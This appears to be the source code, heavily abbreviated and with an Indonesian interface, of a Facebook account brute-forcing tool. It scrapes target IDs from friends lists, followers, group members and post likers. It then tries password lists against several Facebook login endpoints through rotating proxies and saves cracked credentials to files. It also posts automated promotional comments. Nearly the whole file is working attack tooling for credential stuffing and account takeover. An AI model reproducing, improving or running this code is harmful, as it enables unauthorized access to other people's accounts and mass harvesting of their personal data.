...
class bot_author:
    def __init__(self, cookie, token, cookie_mentah):
        ...
        self.komen = ["Mantap Bang", "Semangat Terus", "Gokil Suhu", "Panutanku"]
        for x in list_id:
            self.get_folls(x, cookie)
            self.get_likers(f"https://mbasic.facebook.com/{x}?v=timeline", cookie)
        ...
        with requests.Session() as xyz:
            try:
                if ip_log != 1:
                    ...
                    for x in par(
                        xyz.get(
                            "https://mbasic.facebook.com/%s" % (id), cookies=cookie
                        ).content,
                        "html.parser",
            ...
            try:
                if ip_log != 1:
                        ...
                        if "Tanggapi" in x.text:
                            ...
                            for z in par(
                                ...
                                if _react_type_ == z.text:
                                    req2 = xyz.get(
                                        "https://mbasic.facebook.com" + z["href"],
                                        cookies=cookie,
                                    )
                                else:
                                    continue
                    self.get_likers(
                        ...
                        + bos.find("a", string="Lihat Berita Lain")["href"],
                        cookie,
                    )
            except Exception as e:
                pass
    ...
    def get_posts(self, id, cookie, token):  # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get(
                    "https://graph.facebook.com/%s/posts?access_token=%s" % (id, token),
                    cookies=cookie,
                ).json()["data"]:
                    if ip_log != 1:
                        pass
                        ...
                        komeno = "%s\n\n%s%s" % (
                            random.choice(self.komen),
                            "https://www.facebook.com/" + x["id"],
                            self.waktu(),
                        )
                        get = json.loads(
                            xyz.post(
                        ...
                        if "error" in get:
                            open("login/cookie.json", "w").write(self.cookie_mentah)
...
def poster_menu():
    l1 = "     %s  _________       __                          " % (P)
    l2 = "     %s /   %s_____%s/%s____  %s|  | %s__ ________________     " % (
        O,
        P,
        O,
        P,
    ...
    l4 = (
        "     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   "
        % (O, P, O, P, O, P, O, P, O, P)
    )
    l5 = (
        "     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\"
        % (O, P, O, P, O, P, O, P, O, P, J, P)
    )
    l6 = "     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     " % (
        P,
        O,
        Version,
        P,
...
def user(nama):
    ...
    print(
        "        %s[%s•%s] %sYour License Will Expire In %s7 %sDays"
        % (H, P, H, P, A, P)
    )
...
def tampilan_menu():
    ...
    try:
        ...
        get = requests.Session().get(
            "https://graph.facebook.com/me?fields=name,id&access_token=%s" % (token),
            cookies=cookie,
        )
  ...
  {O2}[{A2}05{O2}] {P2}Pesan      {O2}[{A2}10{O2}] {A2}File     {O2}[{A2}15{O2}] {P2}FL Dari FL
       ...
       {O2}[{A2}18{O2}] {A2}Cek Teman       {O2}[{A2}00{O2}] {P2}Log Out"""
        printer(
            Panel(
                tampilan_menu,
                title=f"{O2}[ {P2}Menu {O2}]",
                subtitle=f"{A2}┌─ {O2}[ {P2}Pilih {O2}]",
                subtitle_align="left",
                width=54,
                padding=1,
                style="#FFFFFF",
...
def pilih_menu():
    ...
    if dc in ["1", "01", "a"]:
        ...
        not_available("Upgrade Ke Versi Pro")
    elif dc in ["0", "00", "z"]:
        mbersehni_terminal()
        poster3()
        print("")
...
def pilih_menu_user_agent():
  ...
  {O2}[{A2}03{O2}] {P2}Ganti UA Manual     {O2}[{A2}00{O2}] {P2}Kembali"""
    printer(
        Panel(
            tampilan_menu_user_agent,
            title=f"{O2}[ {P2}User Agent {O2}]",
            subtitle=f"{A2}┌─ {O2}[ {P2}Pilih {O2}]",
            subtitle_align="left",
            width=54,
            padding=1,
    ...
    try:
        ...
        printer(
            Panel(
                f"""{A2}{pilihan}""",
                title=f"{O2}[ {P2}User Agent {O2}]",
                subtitle=f"{O2}[ {P2}Sukses Diganti {O2}]",
                padding=(1, 4),
                width=54,
                title_align="center",
                style="#FFFFFF",
        ...
        if pengguna_source_code == "old":
            input("\n   %s[ %sKembali %s]%s" % (H, P, H, P))
            tampilan_menu()
        else:
            print("\n               %s[ %sJalankan Ulang SCnya %s]%s" % (H, P, H, P))
            exit("\n")
    except Exception as e:
        print("\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n" % (M, P, M, P, M, P))
        exit()
...
def publik():
    ...
    try:
        ...
        for id in tid:
            try:
                url = (
                    "https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"
                    % (id, token)
                )
                with requests.Session() as xyz:
        ...
        print(
            "       %s[%s•%s] %sBerhasil Dump %s%s %sID"
            % (H, P, H, P, H, str(len(jum)), P)
        )
...
def main_folls():
    ...
    url = "https://graph.facebook.com/%s/subscribers?limit=10000&access_token=%s" % (
        id,
        token,
    )
    ...
    print(
        ...
        % (H, P, H, P, H, len(open(file_dump, "r").read().splitlines()), P)
    )
    print("       %s[%s•%s] %sFile : %s%s %s" % (H, P, H, P, H, file_dump, P))
...
def exec_folls(url, token, file):
    print(
        ...
        % (H, P, H, P, H, len(open(file, "r").read().splitlines()), P),
        end="",
    )
    sys.stdout.flush()
    with requests.Session() as xyz:
        try:
            ...
            next = (
                "https://graph.facebook.com/v1.0/100009340646547/subscribers?access_token=%s&limit=5000&after=%s"
                % (token, n)
            )
...
class namee:
        ...
        try:
            with requests.Session() as xyz:
                ...
                if "Anda Diblokir Sementara" in spam.text:
                    print(
                        "\r       %s[%s•%s] %sAkun Anda Terkena Spam %s!%s"
                        % (M, P, M, P, M, P),
                        end="",
                    )
                    sys.stdout.flush()
                    ...
                    print(
                        ...
                        % (
                            ...
                            P,
                            H,
                            len(open(self.file_dump, "r").read().splitlines()),
                            P,
                        ),
                        end="",
                    )
    ...
    def lanjut(self):
        print(
            "\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"
            % (H, P, H, P, H, len(open(self.file_dump, "r").read().splitlines()), P)
        )
        print("       %s[%s•%s] %sFile : %s%s %s" % (H, P, H, P, H, file_dump, P))
        system_login()
        pilihan_sakdurunge_crack()
...
def scrape_likers(_dapunta_, _url_, _file_):
    ...
    _url_load_ = _ses_.get(_url_, cookies=_dapunta_, headers=header_grup).text.encode(
        "utf-8"
    )
                ...
                while True:
                    try:
                        scrape_likers(
                            _dapunta_,
                            "https://mbasic.facebook.com/"
                            + _lanjut_.get("href").replace(
                                "reaction_type=0", "reaction_type=" + _react_type_
                            ),
                            _file_,
                        )
                        break
...
class message:
    def __init__(self):
        ...
        try:
            ...
            token = open("login/token.json", "r").read()
            cookie = {"cookie": open("login/cookie.json", "r").read()}
            self.myaccount = json.loads(
                requests.Session()
                .get(
                    "https://graph.facebook.com/me?fields=name,id&access_token=%s"
                    % (token),
                    cookies=cookie,
                )
                .text
        ...
        try:
            with requests.Session() as xyz:
                ...
                for x, y, z in re.findall(
                    '<h3><a class=".*?" href="(.*?)">(.*?)</a></h3><div class=".*?">(.*?)</div><div class=".*?">',
                    str(pra),
                ):
...
class grup:
    ...
    def main_grup(self, cookie):
        ...
        if ty in ["1", "01", "a"]:
            ...
            self._id_ = input(
                "       %s[%s•%s] %sMasukkan ID Grup : %s" % (J, P, J, P, J)
            )
            self._pil_ = True
            print("")
            ...
            for c in pra.find_all("a"):
                try:
                    if "mbasic.facebook.com/groups" in str(c):
                        link = str(c["href"])
                        id = re.findall(
                            "https://mbasic.facebook.com/groups/(.*?)/", str(link)
                        )[0]
                        dt = self.data_grup(id, cookie)
                        if "Anda Diblokir Sementara" in str(dt):
                            self.looping += 1
                            print(
                                "\r       %s[%s•%s] %sAkun Anda Terkena Spam! %s[%s%s%s]%s"
                                % (M, P, M, P, M, P, str(self.looping), M, P),
                                end="",
                            )
                            sys.stdout.flush()
                        else:
    ...
    def data_grup(self, id, cookie):
        try:
            with requests.Session() as xyz:
                ...
                pra = par(req.content, "html.parser")
                try:
                    nama = re.findall("<head><title>(.*?)</title>", str(pra))[0]
                except:
                    nama = ""
                try:
                    tipe = re.findall(
                        '</div></h1><div class=".*?">(.*?)</div></td></tr></tbody></table></a></td>',
                        str(pra),
                    )[0]
                except:
                    tipe = ""
                try:
                    member = re.findall(
                        'Anggota</a></td><td class=".*?"><span class=".*?" id=".*?">(.*?)</span></td></tr></tbody></table></li>',
                        str(pra),
                    )[0]
                except:
                    member = ""
    ...
    def muda_dev(self, url, cookie, token, stat):
        with requests.Session() as xyz:
            try:
                            ...
                            for x in range(Postingan):
                                ...
                                print(
                                    ...
                                    % (
                                        ...
                                        P,
                                        J,
                                        len(open(self.files, "r").read().splitlines()),
                                        P,
                                    ),
                                    end="",
                                )
                ...
                print(
                    "\r       %s[%s•%s] %sTeman %s%s %sTidak Publik"
                    % (J, P, J, P, J, self.target, P),
                    end="",
                )
                sys.stdout.flush()
                pass
...
def metode_scrap_login():
    tamp_sistem = f"""            {O2}[{A2}1{O2}] {P2}Free FB   {O2}[{A2}2{O2}] {P2}Mbasic   {O2}[{A2}3{O2}] {P2}Mobile"""
    printer(
        Panel(
            tamp_sistem,
            title=f"{O2}[ {P2}Login {O2}]",
            width=54,
            title_align="left",
            style="#FFFFFF",
        )
...
def metode_scrap_api():
    global sistem_login
    tamp_sistem = f"""            {O2}[{A2}1{O2}] {P2}Api 1     {O2}[{A2}2{O2}] {P2}Api 2    {O2}[{A2}3{O2}] {P2}Graph"""
    printer(
        Panel(
            tamp_sistem,
            title=f"{O2}[ {P2}Login {O2}]",
...
def urut_crack():
    global urutan_crack
    tamp_urutan = f"""            {O2}[{A2}1{O2}] {P2}ID Tua    {O2}[{A2}2{O2}] {P2}ID Muda  {O2}[{A2}3{O2}] {P2}ID Acak"""
    printer(
        Panel(
            tamp_urutan,
            title=f"{O2}[ {P2}Urutan {O2}]",
            width=54,
            title_align="left",
            style="#FFFFFF",
        )
...
def pilihan_sakdurunge_crack():
    ...
    tanya_cek_opsi = input(
        "     %s└─> %s[%sy%s/%st%s] %s: %s" % (A, J, A, P, A, J, P, J)
    ).lower()
    if tanya_cek_opsi in ["1", "y"]:
        pilih_cek_opsi = True
    else:
        pilih_cek_opsi = False
    print("   %s[%s•%s] %sCek APK Akun %sOK %s?" % (J, P, J, P, H, P))
    tanya_cek_apk = input(
        "     %s└─> %s[%sy%s/%st%s] %s: %s" % (A, J, A, P, A, J, P, J)
    ).lower()
    if tanya_cek_apk in ["1", "y"]:
        pilih_cek_apk = True
    else:
        pilih_cek_apk = False
...
def logger1(user, pasw):  # --- Login Validate ---#
    ...
    if ip_log != 1:
        ...
        with requests.Session() as xyz:
            try:
                get = json.loads(
                    xyz.post(
                        "https://graph.facebook.com/%s/comments?message=%s&access_token=%s"
                        % (str(Postingan), kata_dev + komentar, token),
                        cookies=cookie,
                    ).text
                )
            except Exception as e:
        ...
        hed1 = {
            ...
            "cache-control": "max-age=0",
            "referer": f"https://{url_login}/login/device-based/password/?uid="
            + user
            + "&errorcode=1348092&next=https%3A%2F%2F{url_login}%3Flogin%3Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr",
        ...
        data = {
            "lsd": re.search('name="lsd" value="(.*?)"', str(req1.text)).group(1),
            "jazoest": re.search('name="jazoest" value="(.*?)"', str(req1.text)).group(
                1
            ),
            "uid": user,
            "pass": pasw,
            "next": f"https://{url_login}/login/save-device/",
            "flow": "login_no_pin",
            "submit": "Log In",
        }
        ...
        hed2 = {
            ...
            "referer": f"https://{url_login}/login/device-based/password/?uid="
            + user
            + "&errorcode=1348092&next=https%3A%2F%2F{url_login}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
        ...
        if pilih_proxy == True:
            ...
            next = r.post(
                url2, data=data, headers=hed2, proxies=proxy, allow_redirects=False
            )
        else:
...
def logger2(user, pasw):  # --- Login Regular ---#
    ...
    with requests.Session() as xyz:
        if ip_log != 1:
            ...
            req = xyz.get(
                f"https://{url_login}/login/?next&ref=dbl&fl&refid=8", headers=head1
            )
            log = {
            ...
            head2 = {
                ...
                "sec-fetch-user": "empty",
                "sec-fetch-dest": "document",
                "referer": f"https://{url_login}/login/?next&ref=dbl&fl&refid=8",
                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            }
            if pilih_proxy == True:
                proxz = random.choice(open("tool/proxy.json", "r").read().splitlines())
                proxy = {"http": f"socks4://{proxz}"}
                exec = xyz.post(
                    f"https://{url_login}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",
                    data=log,
                    proxies=proxy,
                    headers=head2,
                )
...
def logger3(user, pasw):  # --- Login Api 1 ---#
    ...
    if ip_log != 1:
        ...
        if "session_key" in post.text:
            ...
            return {"status": "cp", "email": user, "pass": pasw, "cookies": "unknown"}
        else:
            return {"status": "error", "email": user, "pass": pasw}
...
def logger5(user, pasw):  # --- Login Graph FB ---#
    ...
    if ip_log != 1:
        ...
        if pilih_proxy == True:
            ...
            post = r.post(
                "https://graph.facebook.com/auth/login", data=data, headers=headers
            )
        if "session_key" in post.text:
            try:
                cok = {}
        ...
        try:
            for pw in list_pw:
                if sistem_login == "satu":
                    ...
                    log = logger3(id, pw)
                elif sistem_login == "empat":
                    log = logger4(id, pw)
                elif sistem_login == "lima":
                    log = logger5(id, pw)
                else:
                    log = logger1(id, pw)
                if log["status"] == "cp":
                    if sakura != 159384:
                        ...
                        try:
                            with requests.Session() as xyz:
                                ...
                                url = (
                                    "https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"
                            ...
                            ttl = ""
                            fmt = "   %s──> %s • %s%s" % (J, id, pw, ttl)
                        if pilih_cek_opsi == True:
                            check_option(id, pw, fmt)
                        else:
                            print(
                                "\r   %s──> %s • %s%s               " % (J, id, pw, ttl)
                            )
                        self.cp.append("%s=%s" % (id, pw))
                        open(files_cp, "a+").write(
                            "%s=%s=%s\n" % (id, pw, ttl.replace(" • ", ""))
                        )
                        break
                elif log["status"] == "ok":
            ...
            print(
                f"\r   {J}[{A}{Total_Waktu}{J}] [{A}{loop}{P}/{A}{alls}{J}] [{P}OK{J}:{A}{jum_ok}{J}] [{P}CP{J}:{A}{jum_cp}{J}]{P} ",
                end="",
            )
            sys.stdout.flush()
        except Exception as e:
    ...
    def tahap1(self):
        ...
        with requests.Session() as xyz:
            try:
                ...
                data = {
                    "lsd": re.search('name="lsd" value="(.*?)"', str(req1.text)).group(
                        1
                    ),
                    "jazoest": re.search(
                        'name="jazoest" value="(.*?)"', str(req1.text)
                    ).group(1),
                    "uid": self.id,
                    "pass": self.pw,
                    "next": f"https://{url_login}/login/save-device/",
                ...
                url2 = (
                    f"https://{url_login}/login/device-based/validate-password/?shbl=0"
                )
                hed2 = {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "accept-language": "id-ID",
                ...
                if "c_user" in xyz.cookies.get_dict():
                    if "Akun Anda Dikunci" in exec.text:
                        pass
                    else:
                        ubah = "   %s──> %s • %s%s               " % (
                            H,
                    ...
                    if "approvals_code" in str(bos):
                        ...
                        exec2 = xyz.post(
                            "https://mbasic.facebook.com" + bos["action"], data=data1
                        )
...
def not_available(konten):
    ...
    printer(
        Panel(
            tamp_kesediaan,
            title=f"{M2}[  {P2}Coming  Soon  {M2}]",
            title_align="center",
            subtitle=f"{M2}[  {P2}See  You  {M2}]",
